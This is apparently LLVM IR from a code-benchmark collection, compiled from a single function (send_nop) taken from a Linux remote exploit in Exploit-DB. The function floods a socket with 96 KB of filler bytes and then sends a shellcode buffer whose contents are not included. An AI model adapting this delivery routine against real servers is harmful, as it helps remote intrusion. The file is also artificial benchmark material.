; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_806.c_send_nop.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_806.c_send_nop.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [5 x i8] c"send\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [28 x i8] c"\0D[+] Sending 96kb Nop [ %s]\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.3 = private unnamed_addr constant [23 x i8] c"[+] Sending Shellcode\0A\00", align 1
@shellcode = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @send_nop(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [1024 x i8], align 16
  %6 = alloca [128 x i8], align 16
  store i32 %0, i32* %2, align 4
  store i32 0, i32* %3, align 4
  store i32 1, i32* %4, align 4
  %7 = bitcast [1024 x i8]* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %7, i8 0, i64 1024, i1 false)
  %8 = bitcast i8* %7 to [1024 x i8]*
  %9 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i32 0, i32 0
  store i8 65, i8* %9, align 16
  %10 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i32 0, i32 1
  store i8 65, i8* %10, align 1
  %11 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i32 0, i32 2
  store i8 64, i8* %11, align 2
  %12 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i32 0, i32 3
  store i8 64, i8* %12, align 1
  %13 = getelementptr inbounds [128 x i8], [128 x i8]* %6, i64 0, i64 0
  %14 = call i32 @memset(i8* %13, i32 0, i32 128)
  %15 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %16 = getelementptr inbounds i8, i8* %15, i64 3
  %17 = call i32 @memset(i8* %16, i32 65, i32 1021)
  %18 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 1023
  store i8 0, i8* %18, align 1
  br label %19

19:                                               ; preds = %40, %1
  %20 = load i32, i32* %3, align 4
  %21 = icmp slt i32 %20, 96
  br i1 %21, label %22, label %56

22:                                               ; preds = %19
  %23 = load i32, i32* %2, align 4
  %24 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %25 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %26 = call i32 @strlen(i8* %25)
  %27 = call i32 @send(i32 %23, i8* %24, i32 %26, i32 0)
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %31

29:                                               ; preds = %22
  %30 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0))
  br label %31

31:                                               ; preds = %29, %22
  %32 = load i32, i32* %3, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %3, align 4
  %34 = load i32, i32* %3, align 4
  %35 = srem i32 %34, 4
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %40, label %37

37:                                               ; preds = %31
  %38 = load i32, i32* %4, align 4
  %39 = add nsw i32 %38, 1
  store i32 %39, i32* %4, align 4
  br label %40

40:                                               ; preds = %37, %31
  %41 = getelementptr inbounds [128 x i8], [128 x i8]* %6, i64 0, i64 0
  %42 = load i32, i32* %4, align 4
  %43 = call i32 @memset(i8* %41, i32 43, i32 %42)
  %44 = getelementptr inbounds [128 x i8], [128 x i8]* %6, i64 0, i64 0
  %45 = load i32, i32* %4, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds i8, i8* %44, i64 %46
  %48 = load i32, i32* %4, align 4
  %49 = sub nsw i32 26, %48
  %50 = call i32 @memset(i8* %47, i32 32, i32 %49)
  %51 = load i32, i32* @stderr, align 4
  %52 = getelementptr inbounds [128 x i8], [128 x i8]* %6, i64 0, i64 0
  %53 = call i32 (i32, i8*, ...) @fprintf(i32 %51, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.1, i64 0, i64 0), i8* %52)
  %54 = getelementptr inbounds [128 x i8], [128 x i8]* %6, i64 0, i64 0
  %55 = call i32 @memset(i8* %54, i32 0, i32 128)
  br label %19

56:                                               ; preds = %19
  %57 = load i32, i32* @stderr, align 4
  %58 = call i32 (i32, i8*, ...) @fprintf(i32 %57, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  %59 = load i32, i32* @stderr, align 4
  %60 = call i32 (i32, i8*, ...) @fprintf(i32 %59, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.3, i64 0, i64 0))
  %61 = load i32, i32* %2, align 4
  %62 = load i8*, i8** @shellcode, align 8
  %63 = load i8*, i8** @shellcode, align 8
  %64 = call i32 @strlen(i8* %63)
  %65 = call i32 @send(i32 %61, i8* %62, i32 %64, i32 0)
  %66 = icmp eq i32 %65, -1
  br i1 %66, label %67, label %69

67:                                               ; preds = %56
  %68 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0))
  br label %69

69:                                               ; preds = %67, %56
  ret void
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
